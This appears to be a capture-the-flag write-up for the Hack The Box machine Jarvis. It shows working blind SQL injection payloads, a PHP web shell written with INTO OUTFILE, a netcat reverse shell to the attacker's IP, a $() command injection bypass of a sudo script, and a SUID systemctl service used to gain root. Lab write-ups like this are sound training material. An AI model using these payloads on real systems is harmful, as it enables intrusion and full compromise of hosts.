
### Initial access
Nmap
```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzv4ZGiO8sDRbIsdZhchg+dZEot3z8++mrp9m0VjP6qxr70SwkE0VGu+GkH7vGapJQLMvjTLjyHojU/AcEm9MWTRWdpIrsUirgawwROic6HmdK2e0bVUZa8fNJIoyY1vPa4uNJRKZ+FNoT8qdl9kvG1NGdBl1+zoFbR9az0sgcNZJ1lZzZNnr7zv/Jghd/ZWjeiiVykomVRfSUCZe5qZ/aV6uVmBQ/mdqpXyxPIl1pG642C5j5K84su8CyoiSf0WJ2Vj8GLiKU3EXQzluQ8QJJPJTjj028yuLjDLrtugoFn43O6+IolMZZvGU9Man5Iy5OEWBay9Tn0UDSdjbSPi1X
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDW2OapO3Dq1CHlnKtWhDucQdl2yQNJA79qP0TDmZBR967hxE9ESMegRuGfQYq0brLSR8Xi6f3O8XL+3bbWbGQ=
|   256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuKufVSUgOG304mZjkK8IrZcAGMm76Rfmq2by7C0Nmo
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Stark Hotel
|_http-server-header: Apache/2.4.25 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Afer testing web in the port 80 we se vulnerable sql url
```
http://supersecurehotel.htb/room.php?cod=1
```
After tesing using order by we found that it have 7 column
```
http://supersecurehotel.htb/room.php?cod=1%20ORDER%20BY%201,2,3,4,5,6,7--
```
 But it althuong it return differnt when using  union paylaod but it dont reflect to the browser so we have to add blind to comfirm our payload.
 ```
 ┌──(kali㉿kali)-[~/HTB/Jarvis]
└─$ time curl -s -o /dev/null http://supersecurehotel.htb/room.php?cod=1%20UNION%20SELECT%201,2,3,4,5,6,IF(1=1,%20SLEEP(5),%20%27A%27);

real    6.35s
user    0.00s
sys     0.00s
cpu     0%

 ```
So we comfirm our payload affect database  let test we can we write webshell to database
```
┌──(kali㉿kali)-[~/HTB/Jarvis]
└─$ time curl -s -o /dev/null http://supersecurehotel.htb/room.php?cod=1%20UNION%20SELECT%201,2,3,4,5,6,IF((SELECT%20privilege_type%20FROM%20information_schema.user_privileges%20WHERE%20privilege_type=%27FILE%27%20LIMIT%201)=%27FILE%27,%20SLEEP(5),%200);


real    6.36s
user    0.01s
sys     0.00s
cpu     0%
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Jarvis]
└─$ time curl -s -o /dev/null "http://supersecurehotel.htb/room.php?cod=1%20UNION%20SELECT%201,2,3,4,5,6,IF(@@secure_file_priv%20IS%20NULL,%20SLEEP(5),%200);"


real    6.39s
user    0.01s
sys     0.00s
cpu     0%
            

```
We see that payload return imediately so we know that we have write priv. But we dont know web dir so we have to find that.  Testing default dir and it work
```
http://supersecurehotel.htb/room.php?cod=1%20UNION%20SELECT%201,2,3,4,5,6,%27%3C?php%20system($_GET[%22cmd%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/cmd.php%27;

┌──(kali㉿kali)-[~/HTB/Jarvis]
└─$ curl http://supersecurehotel.htb/cmd.php?cmd=id                                                                                                                                  
\       Superior Family Room    270     Superior room, perfect for luxury families.
Big room with a lot of extras   <i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i>      room-6.jpg      <li><i class="icon-check"></i> Perfect for traveling couples</li><li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
1       2       3       4       5       6       uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                                                                             

```
 Let get access shell
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Jarvis]
└─$ penelope --oscp-safe --no-log -p 4444                                    

[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => jarvis 10.129.229.137 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@jarvis:/var/www/html$ 


 ```

### Lateral Movement
Run sudo -l
```
www-data@jarvis:/var/www/html$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/var/www/html$ cat /var/www/Admin-Utilities/simpler.py

```
Let run under user pepper and read the scripte to find way to get user shell
We see the func could lead to spawn shell.

```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

```

We use this payload to bypass the check  the resaon behind it we can use varibale method to cover our command  use can learn this here https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with--1
```
127.0.0.1$(cmd_here)
127.0.0.1$(/bin/bash)
```


```
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: 127.0.0.1$(/bin/bash)
pepper@jarvis:/var/www/html$ 
pepper@jarvis:/var/www/html$ nc 10.10.17.47 5555 -e /bin/bash

```
We need to create double revshell for stable shell
```bash
┌──(kali㉿kali)-[~/HTB/Jarvis]
└─$ penelope --oscp-safe --no-log -p 5555                                    
[+] Listening for reverse shells on 0.0.0.0:5555 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => jarvis 10.129.229.137 Linux-x86_64 👤 pepper(1000) 😍 Session ID <1>

[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pepper@jarvis:/var/www/html$ id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
pepper@jarvis:/var/www/html$ 


```
### Priv escalation

Run linpeas and detect suid
```
pepper@jarvis:~$ ls -la /bin/systemctl 
-rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl

```
GFTO bin its only allow user folder not /tmp cuz it it allow it will exploit in www-data  we have to create it in home folder of user
```
echo '[Service]
> Type=oneshot
> ExecStart=/bin/bash -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > /home/pepper/rootme.service

systemctl link /home/pepper/rootme.service
systemctl enable --now /home/pepper/rootme.service
```

```
pepper@jarvis:~$ bash -p
bash-4.4# id
uid=1000(pepper) gid=1000(pepper) euid=0(root) egid=0(root) groups=0(root),1000(pepper)
bash-4.4# 


```